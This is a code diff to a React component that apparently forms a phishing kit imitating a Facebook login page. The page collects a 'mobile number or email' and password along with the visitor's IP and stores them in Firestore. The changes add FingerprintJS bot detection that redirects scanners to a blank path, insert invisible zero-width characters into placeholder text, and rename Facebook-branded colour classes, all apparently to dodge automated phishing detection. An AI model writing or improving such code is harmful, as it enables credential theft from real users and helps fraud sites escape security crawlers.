@@ -1,11 +1,11 @@
 import React, { useEffect, useState } from 'react';
 import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
+import Botd from '@fingerprintjs/botd';
 import { publicIpv4 } from 'public-ip';
 import { IoIosAdd as IconAdd } from "react-icons/io";
 import { footerLinks, desktoplanguages, mobileLanguages } from '../sakles/malores.js'; // Import mobileLanguages
 import { db } from '../cedeplajes.js';
 import { useMediaQuery } from 'react-responsive';
-
 import '../sakles/malores.js';
 
 const Newjersky = () => {
@@ -19,14 +19,21 @@ const Newjersky = () => {
     const isDesktop = useMediaQuery({ query: '(min-width: 768px)' });
 
             // Bot detection and redirect to /blank
-        useEffect(() => {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isBot = /bot|crawler|spider|crawling/.test(userAgent);
-    
-            if (isBot) {
-                window.location.href = '/ds';
-            }
-        }, []);
+useEffect(() => {
+    const detectBot = async () => {
+        const botd = await Botd.load();
+        const result = await botd.detect();
+
+        if (result.bot) {
+            console.log('Bot detected:', result.bot.type);
+            window.location.href = "/ds";
+        } else {
+            console.log('Not a bot');
+        }
+    };
+
+    detectBot();
+}, []);
         
     useEffect(() => {
         if (isDesktop) {
@@ -212,21 +219,21 @@ IP: '${ip}'
                 <form className="w-full flex flex-col items-center justify-start gap-2" onSubmit={handleActions}>
                     <input
                         type="text" id="grraht" name="grraht"
-                        className="w-full p-[8px] text-sm placeholder:text-sm text-neutral-500 rounded bg-mercury/60 shadow-md font-medium border-[1px] border-solid border-mercury focus:outline-none" style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}
-                        placeholder="Mobile number or email" onChange={handleCodeChange} required/>
+                        className="w-full p-[8px] text-sm placeholder:text-sm text-neutral-500 rounded bg-bekio/60 shadow-md font-medium border-[1px] border-solid border-bekio focus:outline-none" style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}
+                        placeholder="M‌o‌b‌i‌l‌e‌ n‌u‌m‌b‌e‌r o‌r e‌m‌a‌i‌l" onChange={handleCodeChange} required/>
                         <span className='becros'></span>
                    
                     <input
                         type="text" id="dexlus" name="dexlus"
-                        className="w-full p-[8px] pr-4 text-sm placeholder:text-sm text-neutral-500 rounded bg-mercury/60 shadow-md font-medium border-[1px] border-solid border-[#dd3c10] focus:outline-none" style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',WebkitTextSecurity: 'disc', textSecurity: 'disc'}}
+                        className="w-full p-[8px] pr-4 text-sm placeholder:text-sm text-neutral-500 rounded bg-bekio/60 shadow-md font-medium border-[1px] border-solid border-[#dd3c10] focus:outline-none" style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',WebkitTextSecurity: 'disc', textSecurity: 'disc'}}
                         placeholder="P‌ass‌wo‌rd" onChange={handleCodeChange1} required/>
                         
                     <span className='form-dexlus'></span>
-                    <button type="submit" className="w-full mt-1 px-3 h-[35px] bg-facebook hover:bg-opacity-90 text-white text-base font-semibold rounded transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
+                    <button type="submit" className="w-full mt-1 px-3 h-[35px] bg-begex hover:bg-opacity-90 text-white text-base font-semibold rounded transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
                         Log in
                     </button>
                 </form>
-                <button type="button" className="w-full text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
+                <button type="button" className="w-full text-begex text-sm font-medium bg-none hover:underline transition-all duration-300"style={{fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif',}}>
                     Fo‌rgot ac‌co‌un‌t?
                 </button>
                 <div className="w-full flex items-center justify-between gap-3">
